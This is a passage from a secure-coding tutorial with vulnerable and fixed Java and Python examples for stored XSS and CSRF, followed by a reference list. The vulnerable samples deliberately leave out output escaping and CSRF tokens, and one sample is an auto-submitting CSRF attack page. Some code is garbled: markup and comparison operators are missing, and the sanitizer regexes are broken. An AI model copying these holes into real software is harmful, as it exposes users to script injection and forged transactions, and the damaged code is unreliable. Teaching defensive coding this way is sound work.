    private void showComments(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        
        try {
            Connection conn = DriverManager.getConnection(
                "jdbc:mysql://localhost:3306/myapp", "user", "pass");
            
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(
                "SELECT username, comment FROM comments ORDER BY id DESC LIMIT 10");
            
            response.setContentType("text/html");
            PrintWriter out = response.getWriter();
            
            out.println("");
            out.println("Recent Comments");
            
            while (rs.next()) {
                String username = rs.getString("username");
                String comment = rs.getString("comment");
                
                // VULNERABLE: Displaying stored user content without escaping
                out.println("");
                out.println("" + username + ": ");
                out.println(comment);  // XSS vulnerability!
                out.println("");
            }
            
            out.println("");
            
        } catch (SQLException e) {
            response.getWriter().println("Database error: " + e.getMessage());
        }
    }
}
```

### Java Example - Secure Code

```java
import javax.servlet.http.*;
import java.io.*;
import java.sql.*;
import java.util.regex.Pattern;
import org.apache.commons.text.StringEscapeUtils;
import org.owasp.encoder.Encode;

public class SecureXSSServlet extends HttpServlet {
    
    // Input validation patterns
    private static final Pattern USERNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9_]{3,30}$");
    private static final Pattern NAME_PATTERN = Pattern.compile("^[a-zA-Z\\s]{1,50}$");
    
    // Maximum lengths
    private static final int MAX_QUERY_LENGTH = 100;
    private static final int MAX_COMMENT_LENGTH = 500;
    private static final int MAX_BIO_LENGTH = 200;
    
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String action = request.getParameter("action");
        
        try {
            if ("search".equals(action)) {
                handleSearch(request, response);
            } else if ("profile".equals(action)) {
                showProfile(request, response);
            } else if ("comments".equals(action)) {
                showComments(request, response);
            } else {
                response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid action");
            }
        } catch (Exception e) {
            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, 
                "Internal server error");
        }
    }
    
    private void handleSearch(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        
        String query = request.getParameter("q");
        if (query == null) query = "";
        
        // SECURE: Input validation
        if (query.length() > MAX_QUERY_LENGTH) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Query too long");
            return;
        }
        
        response.setContentType("text/html; charset=UTF-8");
        response.setCharacterEncoding("UTF-8");
        PrintWriter out = response.getWriter();
        
        // SECURE: HTML escaping for all user input
        String escapedQuery = Encode.forHtml(query);
        
        out.println("");
        out.println("");
        out.println("");
        out.println("");
        out.println("Search Results");
        out.println("");
        out.println("");
        out.println("Search Results for: " + escapedQuery + "");
        out.println("You searched for: " + escapedQuery + "");
        
        // SECURE: JavaScript context escaping
        out.println("");
        out.println("var searchQuery = '" + Encode.forJavaScript(query) + "';");
        out.println("console.log('Search: ' + searchQuery);");
        out.println("");
        
        out.println("");
    }
    
    private void showProfile(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        
        String name = request.getParameter("name");
        String bio = request.getParameter("bio");
        
        if (name == null) name = "Guest";
        if (bio == null) bio = "";
        
        // SECURE: Input validation
        if (!NAME_PATTERN.matcher(name).matches()) {
            name = "Guest";
        }
        
        if (bio.length() > MAX_BIO_LENGTH) {
            bio = bio.substring(0, MAX_BIO_LENGTH);
        }
        
        // SECURE: Remove potentially dangerous content
        bio = sanitizeUserContent(bio);
        
        response.setContentType("text/html; charset=UTF-8");
        response.setCharacterEncoding("UTF-8");
        PrintWriter out = response.getWriter();
        
        // SECURE: Proper escaping for different contexts
        String htmlEscapedName = Encode.forHtml(name);
        String attrEscapedName = Encode.forHtmlAttribute(name);
        String cssEscapedName = Encode.forCssString(name);
        String htmlEscapedBio = Encode.forHtml(bio);
        
        out.println("");
        out.println("");
        out.println("");
        out.println("");
        out.println("Profile: " + htmlEscapedName + "");
        out.println("");
        out.println("");
        out.println("Welcome " + htmlEscapedName + "!");
        out.println("Bio: " + htmlEscapedBio + "");
        
        // SECURE: HTML attribute context escaping
        out.println("");
        
        // SECURE: CSS context escaping
        out.println("");
        out.println(".user-name:before { content: '" + cssEscapedName + "'; }");
        out.println("");
        
        out.println("");
    }
    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        String action = request.getParameter("action");
        
        try {
            if ("comment".equals(action)) {
                handleComment(request, response);
            } else {
                response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid action");
            }
        } catch (Exception e) {
            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, 
                "Internal server error");
        }
    }
    
    private void handleComment(HttpServletRequest request, HttpServletResponse response) 
            throws IOException, SQLException {
        
        String username = request.getParameter("username");
        String comment = request.getParameter("comment");
        
        // SECURE: Input validation
        if (username == null || comment == null || 
            !USERNAME_PATTERN.matcher(username).matches() ||
            comment.length() > MAX_COMMENT_LENGTH) {
            
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid input");
            return;
        }
        
        // SECURE: Sanitize comment content
        String sanitizedComment = sanitizeUserContent(comment);
        
        try (Connection conn = DriverManager.getConnection(
                "jdbc:mysql://localhost:3306/myapp?useSSL=true", 
                System.getProperty("db.user"), 
                System.getProperty("db.password"))) {
            
            try (PreparedStatement stmt = conn.prepareStatement(
                    "INSERT INTO comments (username, comment, created_at) VALUES (?, ?, NOW())")) {
                
                stmt.setString(1, username);
                stmt.setString(2, sanitizedComment);
                stmt.executeUpdate();
            }
            
            response.setContentType("text/html; charset=UTF-8");
            PrintWriter out = response.getWriter();
            
            // SECURE: Proper escaping for output
            String escapedUsername = Encode.forHtml(username);
            String escapedComment = Encode.forHtml(sanitizedComment);
            
            out.println("");
            out.println("");
            out.println("Comment Submitted");
            out.println("");
            out.println("Thank you " + escapedUsername + "!");
            out.println("Your comment: " + escapedComment + "");
            out.println("View all comments");
            out.println("");
        }
    }
    
    private void showComments(HttpServletRequest request, HttpServletResponse response) 
            throws IOException, SQLException {
        
        try (Connection conn = DriverManager.getConnection(
                "jdbc:mysql://localhost:3306/myapp?useSSL=true", 
                System.getProperty("db.user"), 
                System.getProperty("db.password"))) {
            
            try (Statement stmt = conn.createStatement();
                 ResultSet rs = stmt.executeQuery(
                     "SELECT username, comment, created_at FROM comments " +
                     "ORDER BY created_at DESC LIMIT 10")) {
                
                response.setContentType("text/html; charset=UTF-8");
                PrintWriter out = response.getWriter();
                
                out.println("");
                out.println("");
                out.println("");
                out.println("");
                out.println("Recent Comments");
                out.println("");
                out.println(".comment { border: 1px solid #ccc; padding: 10px; margin: 5px; }");
                out.println(".username { font-weight: bold; color: #333; }");
                out.println("");
                out.println("");
                out.println("");
                out.println("Recent Comments");
                
                while (rs.next()) {
                    String username = rs.getString("username");
                    String comment = rs.getString("comment");
                    Timestamp createdAt = rs.getTimestamp("created_at");
                    
                    // SECURE: HTML escaping for all displayed content
                    String escapedUsername = Encode.forHtml(username);
                    String escapedComment = Encode.forHtml(comment);
                    
                    out.println("");
                    out.println("" + escapedUsername + ": ");
                    out.println("" + escapedComment + "");
                    out.println("(" + createdAt + ")");
                    out.println("");
                }
                
                out.println("");
            }
        }
    }
    
    private String sanitizeUserContent(String content) {
        if (content == null) return "";
        
        // Remove potentially dangerous content
        content = content.replaceAll("(?i)]*>.*?", "");
        content = content.replaceAll("(?i)]*>.*?", "");
        content = content.replaceAll("(?i)]*>.*?", "");
        content = content.replaceAll("(?i)]*>.*?", "");
        content = content.replaceAll("(?i)javascript:", "");
        content = content.replaceAll("(?i)vbscript:", "");
        content = content.replaceAll("(?i)data:", "");
        
        // Remove event handlers
        content = content.replaceAll("(?i)on\\w+\\s*=", "");
        
        return content.trim();
    }
}
```

## 9. Client-Side Request Forgery (CSRF) (CWE-352)

### Overview

Cross-Site Request Forgery (CSRF) is an attack that forces users to execute unwanted actions on web applications where they're authenticated [23][24]. CSRF attacks exploit the trust that a web application has in the user's browser, allowing attackers to perform actions on behalf of authenticated users without their knowledge [24].

### Python Example - Vulnerable Code

```python
from flask import Flask, request, session, redirect, url_for
import sqlite3

app = Flask(__name__)
app.secret_key = 'vulnerable-key'

@app.route('/login', methods=['GET', 'POST'])
def vulnerable_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Simplified authentication
        if username == 'admin' and password == 'password':
            session['user'] = username
            session['authenticated'] = True
            return redirect('/dashboard')
    
    return '''
        
            Username: 
            Password: 
            
        
    '''

@app.route('/dashboard')
def dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    return '''
        Admin Dashboard
        Welcome, admin!
        Transfer Money
        Delete User
        Change Password
    '''

@app.route('/transfer', methods=['GET', 'POST'])
def vulnerable_transfer():
    if not session.get('authenticated'):
        return redirect('/login')
    
    if request.method == 'POST':
        # VULNERABLE: No CSRF protection
        to_account = request.form.get('to_account')
        amount = request.form.get('amount')
        
        # Process transfer (simplified)
        conn = sqlite3.connect('bank.db')
        cursor = conn.cursor()
        cursor.execute("INSERT INTO transfers (to_account, amount, from_user) VALUES (?, ?, ?)",
                      (to_account, amount, session['user']))
        conn.commit()
        conn.close()
        
        return f"Transfer of ${amount} to account {to_account} completed!"
    
    # VULNERABLE: Form without CSRF token
    return '''
        Transfer Money
        
            To Account: 
            Amount: 
            
        
    '''

@app.route('/delete_user', methods=['POST'])
def vulnerable_delete_user():
    if not session.get('authenticated'):
        return "Unauthorized", 401
    
    # VULNERABLE: State-changing operation via POST without CSRF protection
    user_id = request.form.get('user_id')
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    
    return f"User {user_id} deleted successfully!"

@app.route('/change_password', methods=['GET', 'POST'])
def vulnerable_change_password():
    if not session.get('authenticated'):
        return redirect('/login')
    
    if request.method == 'POST':
        # VULNERABLE: Password change without CSRF protection
        new_password = request.form.get('new_password')
        
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET password = ? WHERE username = ?",
                      (new_password, session['user']))
        conn.commit()
        conn.close()
        
        return "Password changed successfully!"
    
    return '''
        Change Password
        
            New Password: 
            
        
    '''

# VULNERABLE: API endpoint without CSRF protection
@app.route('/api/settings', methods=['POST'])
def vulnerable_api_settings():
    if not session.get('authenticated'):
        return {"error": "Unauthorized"}, 401
    
    # Even JSON APIs can be vulnerable to CSRF
    email = request.json.get('email')
    notifications = request.json.get('notifications')
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("UPDATE user_settings SET email = ?, notifications = ? WHERE username = ?",
                  (email, notifications, session['user']))
    conn.commit()
    conn.close()
    
    return {"message": "Settings updated"}
```

An attacker could exploit this by creating a malicious page that automatically submits forms or makes requests to the vulnerable application [23][25]:

```html



    You Are a Winner!
    
    
        
        
    
    
    
        // Auto-submit the form
        document.getElementById('csrf-form').submit();
    


```

### Python Example - Secure Code

```python
from flask import Flask, request, session, redirect, url_for, render_template_string
import sqlite3
import secrets
import hmac
import hashlib
import time

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

def generate_csrf_token():
    """Generate a cryptographically secure CSRF token"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_urlsafe(32)
    return session['csrf_token']

def validate_csrf_token(token):
    """Validate CSRF token"""
    if not token or 'csrf_token' not in session:
        return False
    
    # Use constant-time comparison to prevent timing attacks
    return hmac.compare_digest(session['csrf_token'], token)

def require_csrf_token(f):
    """Decorator to require CSRF token for POST requests"""
    def decorated_function(*args, **kwargs):
        if request.method == 'POST':
            token = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
            if not validate_csrf_token(token):
                return "CSRF token validation failed", 403
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def secure_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # SECURE: Validate credentials properly
        if validate_credentials(username, password):
            session['user'] = username
            session['authenticated'] = True
            # SECURE: Regenerate session ID after login
            session.permanent = True
            return redirect('/dashboard')
        else:
            return "Invalid credentials", 401
    
    # SECURE: Include CSRF token in login form
    csrf_token = generate_csrf_token()
    return render_template_string('''
        
            
            Username: 
            Password: 
            
        
    ''', csrf_token=csrf_token)

@app.route('/dashboard')
def dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    csrf_token = generate_csrf_token()
    return render_template_string('''
        Admin Dashboard
        Welcome, {{ user }}!
        
        Transfer Money
        Change Password
        
            
            
        
    ''', user=session['user'], csrf_token=csrf_token)

@app.route('/transfer', methods=['GET', 'POST'])
@require_csrf_token
def secure_transfer():
    if not session.get('authenticated'):
        return redirect('/login')
    
    if request.method == 'POST':
        to_account = request.form.get('to_account')
        amount = request.form.get('amount')
        
        # SECURE: Additional validation
        if not to_account or not amount:
            return "Missing required fields", 400
        
        try:
            amount = float(amount)
            if amount  10000:  # Business rule validation
                return "Invalid amount", 400
        except ValueError:
            return "Invalid amount format", 400
        
        # SECURE: Process transfer with proper validation
        conn = sqlite3.connect('bank.db')
        cursor = conn.cursor()
        
        # Check if user has sufficient balance (simplified)
        cursor.execute("SELECT balance FROM accounts WHERE username = ?", (session['user'],))
        balance_row = cursor.fetchone()
        
        if not balance_row or balance_row[0] Transfer Money
        
            
            To Account: 
            Amount: 
            
        
        Back to Dashboard
    ''', csrf_token=csrf_token)

@app.route('/change_password', methods=['GET', 'POST'])
@require_csrf_token
def secure_change_password():
    if not session.get('authenticated'):
        return redirect('/login')
    
    if request.method == 'POST':
        current_password = request.form.get('current_password')
        new_password = request.form.get('new_password')
        confirm_password = request.form.get('confirm_password')
        
        # SECURE: Validate current password
        if not validate_current_password(session['user'], current_password):
            return "Current password is incorrect", 400
        
        # SECURE: Validate new password
        if new_password != confirm_password:
            return "New passwords do not match", 400
        
        if len(new_password) Change Password
        
            
            Current Password: 
            New Password: 
            Confirm Password: 
            
        
        Back to Dashboard
    ''', csrf_token=csrf_token)

# SECURE: API endpoint with CSRF protection
@app.route('/api/settings', methods=['POST'])
def secure_api_settings():
    if not session.get('authenticated'):
        return {"error": "Unauthorized"}, 401
    
    # SECURE: CSRF protection for JSON APIs
    csrf_token = request.headers.get('X-CSRF-Token')
    if not validate_csrf_token(csrf_token):
        return {"error": "CSRF token validation failed"}, 403
    
    # SECURE: Content-Type validation
    if request.content_type != 'application/json':
        return {"error": "Content-Type must be application/json"}, 400
    
    try:
        data = request.get_json()
        if not data:
            return {"error": "Invalid JSON"}, 400
        
        email = data.get('email', '').strip()
        notifications = data.get('notifications', False)
        
        # SECURE: Input validation
        if email and not validate_email(email):
            return {"error": "Invalid email format"}, 400
        
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE user_settings SET email = ?, notifications = ? WHERE username = ?",
                      (email, notifications, session['user']))
        conn.commit()
        conn.close()
        
        return {"message": "Settings updated successfully"}
        
    except Exception as e:
        return {"error": "Invalid request"}, 400

@app.route('/logout', methods=['POST'])
@require_csrf_token
def secure_logout():
    # SECURE: Clear session on logout
    session.clear()
    return redirect('/login')

def validate_credentials(username, password):
    """Validate user credentials (simplified)"""
    # In production, use proper password hashing (bcrypt, scrypt, etc.)
    return username == 'admin' and password == 'password'

def validate_current_password(username, password):
    """Validate current password"""
    # Simplified validation - in production, check against hashed password
    return password == 'password'

def hash_password(password):
    """Hash password (simplified for example)"""
    # In production, use bcrypt or similar
    return hashlib.sha256(password.encode()).hexdigest()

def validate_email(email):
    """Basic email validation"""
    import re
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

# SECURE: Add security headers
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    # SameSite cookie protection
    response.headers['Set-Cookie'] = response.headers.get('Set-Cookie', '') + '; SameSite=Strict'
    return response

if __name__ == '__main__':
    app.run(debug=False, host='127.0.0.1')
```

### Java Example - Vulnerable Code

```java
import javax.servlet.http.*;
import java.io.*;
import java.sql.*;

public class VulnerableCSRFServlet extends HttpServlet {
    
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        HttpSession session = request.getSession();
        String action = request.getParameter("action");
        
        if ("login".equals(action)) {
            showLoginForm(response);
        } else if ("dashboard".equals(action)) {
            if (isAuthenticated(session)) {
                showDashboard(response);
            } else {
                response.sendRedirect("?action=login");
            }
        } else if ("transfer".equals(action)) {
            if (isAuthenticated(session)) {
                showTransferForm(response);
            } else {
                response.sendRedirect("?action=login");
            }
        }
    }
    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws ServletException, IOException {
        
        HttpSession session = request.getSession();
        String action = request.getParameter("action");
        
        if ("login".equals(action)) {
            handleLogin(request, response, session);
        } else if ("transfer".equals(action)) {
            // VULNERABLE: No CSRF protection
            handleTransfer(request, response, session);
        } else if ("delete_user".equals(action)) {
            // VULNERABLE: State-changing operation without CSRF protection
            handleDeleteUser(request, response, session);
        } else if ("change_password".equals(action)) {
            // VULNERABLE: Password change without CSRF protection
            handlePasswordChange(request, response, session);
        }
    }
    
    private void showLoginForm(HttpServletResponse response) throws IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        
        // VULNERABLE: Login form without CSRF token
        out.println("");
        out.println("Login");
        out.println("");
        out.println("");
        out.println("Username: ");
        out.println("Password: ");
        out.println("");
        out.println("");
        out.println("");
    }
    
    private void handleLogin(HttpServletRequest request, HttpServletResponse response, 
                           HttpSession session) throws IOException {
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        
        // Simplified authentication
        if ("admin".equals(username) && "password".equals(password)) {
            session.setAttribute("user", username);
            session.setAttribute("authenticated", true);
            response.sendRedirect("?action=dashboard");
        } else {
            response.getWriter().println("Invalid credentials");
        }
    }
    
    private void showDashboard(HttpServletResponse response) throws IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        
        out.println("");
        out.println("Admin Dashboard");
        out.println("Welcome, admin!");
        out.println("Transfer Money");
        out.println("Delete User");
        
        // VULNERABLE: JavaScript that makes CSRF-vulnerable requests
        out.println("");
        out.println("function deleteUser() {");
        out.println("  var userId = prompt('Enter user ID to delete:');");
        out.println("  if (userId) {");
        out.println("    var form = document.createElement('form');");
        out.println("    form.method = 'POST';");
        out.println("    form.action = window.location.href;");
        out.println("    var actionInput = document.createElement('input');");
        out.println("    actionInput.type = 'hidden';");
        out.println("    actionInput.name = 'action';");
        out.println("    actionInput.value = 'delete_user';");
        out.println("    var userIdInput = document.createElement('input');");
        out.println("    userIdInput.type = 'hidden';");
        out.println("    userIdInput.name = 'user_id';");
        out.println("    userIdInput.value = userId;");
        out.println("    form.appendChild(actionInput);");
        out.println("    form.appendChild(userIdInput);");
        out.println("    document.body.appendChild(form);");
        out.println("    form.submit();");
        out.println("  }");
        out.println("}");
        out.println("");
        
        out.println("");
    }
    
    private void showTransferForm(HttpServletResponse response) throws IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        
        // VULNERABLE: Transfer form without CSRF token
        out.println("");
        out.println("Transfer Money");
        out.println("");
        out.println("");
        out.println("To Account: ");
        out.println("Amount: ");
        out.println("");
        out.println("");
        out.println("");
    }
    
    private void handleTransfer(HttpServletRequest request, HttpServletResponse response, 
                              HttpSession session) throws IOException {
        if (!isAuthenticated(session)) {
            response.sendError(HttpServletResponse.SC_UNAUTHORIZED);
            return;
        }
        
        // VULNERABLE: No CSRF token validation
        String toAccount = request.getParameter("to_account");
        String amount = request.getParameter("amount");
        
        try {
            Connection conn = DriverManager.getConnection(
                "jdbc:mysql://localhost:3306/bank", "user", "pass");
            
            PreparedStatement stmt = conn.prepareStatement(
                "INSERT INTO transfers (to_account, amount, from_user) VALUES (?, ?, ?)");
            stmt.setString(1, toAccount);
            stmt.setString(2, amount);
            stmt.setString(3, (String) session.getAttribute("user"));
            stmt.executeUpdate();
            
            response.getWriter().println("Transfer of $" + amount + 
                                       " to account " + toAccount + " completed!");
            
        } catch (SQLException e) {
            response.getWriter().println("Transfer failed: " + e.getMessage());
        }
    }
    
    private void handleDeleteUser(HttpServletRequest request, HttpServletResponse response, 
                                HttpSession session) throws IOException {
        if (!isAuthenticated(session)) {
            response.sendError(HttpServletResponse.SC_UNAUTHORIZED);
            return;
        }
        
        // VULNERABLE: No CSRF protection for destructive operation
        String userId = request.getParameter("user_id");
        
        try {
            Connection conn = DriverManager.getConnection(
                "jdbc:mysql://localhost:3306/myapp", "user", "pass");
            
            PreparedStatement stmt = conn.prepareStatement(
                "DELETE FROM users WHERE id = ?");
            stmt.setString(1, userId);
            int deleted = stmt.executeUpdate();
            
            response.getWriter().println("User " + userId + " deleted. Rows affected: " + deleted);
            
        } catch (SQLException e) {
            response.getWriter().println("Delete failed: " + e.getMessage());
        }
    }
    
    private boolean isAuthenticated(HttpSession session) {
        return session != null && 
               Boolean.TRUE.equals(session.getAttribute("authenticated"));
    }
}
```

### Java Example - Secure Code

```java
import javax.servlet.http.*;
import java.io.*;
import java.sql.*;
import java.security.SecureRandom;
import java.util.Base64;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

public class SecureCSRFServlet extends HttpServlet {
    
    private static final String CSRF_TOKEN_SESSION_KEY = "csrf_token";
    private static final String HMAC_ALGORITHM = "HmacSHA256";
    private static final String SECRET_KEY = "your-secret-key-here"; // In production, use environment variable
    private static final SecureRandom secureRandom = new SecureRandom();
    
    protected void doGet

[1] https://cwe.mitre.org/data/definitions/77.html
[2] https://cwe.mitre.org/data/definitions/78.html
[3] https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_python.html
[4] https://www.veracode.com/security/java/cwe-78/
[5] https://support.waratek.com/knowledge/best-practices-unsafe-deserialization-of-untrusted-data
[6] https://krishnag.ceo/blog/2024-cwe-top-25-most-dangerous-software-weaknesses-deserialisation-of-untrusted-data-cwe-502/
[7] https://www.linkedin.com/pulse/python-deserialization-attack-how-build-pickle-bomb-yuancheng-liu-wi7oc
[8] https://www.veracode.com/security/java/cwe-639/
[9] https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
[10] https://snyk.io/blog/insecure-direct-object-references-python/
[11] https://seminar.vercel.app/ch5/BAC/idor.html
[12] https://cqr.company/web-vulnerabilities/predictable-session-id/
[13] https://www.aptori.com/blog/understanding-ssrf-server-side-request-forgery-and-its-impact-on-api-security
[14] https://blog.shiftleft.io/cwe-918-f1fd54e0415b
[15] https://www.invicti.com/learn/server-side-request-forgery-ssrf/
[16] https://cwe.mitre.org/data/definitions/200.html
[17] https://codeql.github.com/codeql-query-help/python/py-hardcoded-credentials/
[18] https://cqr.company/web-vulnerabilities/use-of-hard-coded-credentials/
[19] https://www.veracode.com/security/java/cwe-89/
[20] https://fossa.com/blog/all-about-cwe-79-cross-site-scripting/
[21] https://www.invicti.com/blog/web-security/how-to-prevent-xss-in-java/
[22] https://semgrep.dev/docs/cheat-sheets/flask-xss
[23] https://learn.snyk.io/lesson/csrf-attack/
[24] https://support.waratek.com/knowledge/best-practices-cross-site-request-forgery
[25] https://knowledge-base.secureflag.com/vulnerabilities/cross_site_request_forgery/cross_site_request_forgery_python.html
[26] https://pvs-studio.com/en/blog/terms/6547/
[27] https://pvs-studio.com/fr/pvs-studio/sast/owasptopten/
[28] https://www.pullrequest.com/blog/mitigating-cwe-352-cross-site-request-forgery-in-ruby-applications/
[29] https://www.invicti.com/learn/xml-external-entity-xxe/
[30] https://portswigger.net/web-security/deserialization/exploiting
[31] https://learn.microsoft.com/en-us/aspnet/web-api/overview/security/preventing-cross-site-request-forgery-csrf-attacks
[32] https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
[33] https://stackoverflow.com/questions/44040687/preventing-my-script-from-os-command-injection-python
[34] https://infosecwriteups.com/unveiling-command-injection-vulnerabilities-in-java-deep-dive-into-processbuilder-and-runtime-50d8e25d06ab
[35] https://help.fluidattacks.com/portal/en/kb/articles/criteria-fixes-java-096
[36] https://agrohacksstuff.io/posts/os-commands-with-python/
[37] https://openjdk.org/jeps/8263697
[38] https://escape.tech/blog/idor-in-graphql/
[39] https://portswigger.net/web-security/access-control/idor
[40] https://codearsenalcommunity.github.io/how-to-fix-idor-in-java/
[41] https://knowledge-base.secureflag.com/vulnerabilities/broken_authentication/broken_authentication_python.html
[42] https://www.spiceworks.com/it-security/vulnerability-management/articles/insecure-direct-object-reference-idor/
[43] https://docs.djangoproject.com/en/5.2/topics/security/
[44] https://semgrep.dev/docs/cheat-sheets/django-xss
[45] https://stackoverflow.com/questions/67303983/xss-prevention-in-python-flask-restful-api
[46] https://help.fluidattacks.com/portal/en/kb/articles/criteria-fixes-java-010
[47] https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
[48] https://www.stackhawk.com/blog/django-xml-external-entities-xxe-guide-examples-and-prevention/
[49] https://codeql.github.com/codeql-query-help/python/py-xxe/
[50] https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
[51] https://www.acunetix.com/blog/web-security-zone/how-to-mitigate-xxe-vulnerabilities-in-python/
[52] https://deepsource.com/directory/java/issues/JAVA-A1052
[53] https://virtualcyberlabs.com/xml-external-entity-xxe-attacks/
[54] https://knowledge-base.secureflag.com/vulnerabilities/xml_injection/xml_entity_expansion_java.html
[55] https://owasp.org/www-community/attacks/Command_Injection
[56] https://portswigger.net/kb/issues/00100100_os-command-injection
[57] https://cwe.mitre.org/data/definitions/918.html
[58] https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/
[59] https://www.linkedin.com/pulse/a10-ssrf-server-side-request-forgery-cwe-918-jigyasa-trivedi-ugyac
[60] https://cwe.mitre.org/data/definitions/352.html
[61] https://owasp.org/www-community/attacks/csrf
[62] https://snyk.io/blog/command-injection-python-prevention-examples/
[63] https://semgrep.dev/docs/cheat-sheets/python-command-injection
[64] https://www.stackhawk.com/blog/command-injection-python/
[65] https://www.wallarm.com/what/what-is-the-insecure-direct-object-references-vulnerability
[66] https://flask.palletsprojects.com/en/stable/web-security/
[67] https://www.linkedin.com/advice/1/how-do-you-prevent-cross-site-scripting-python-d1bmc
[68] https://security.snyk.io/vuln/SNYK-UNMANAGED-PYTHON-5876624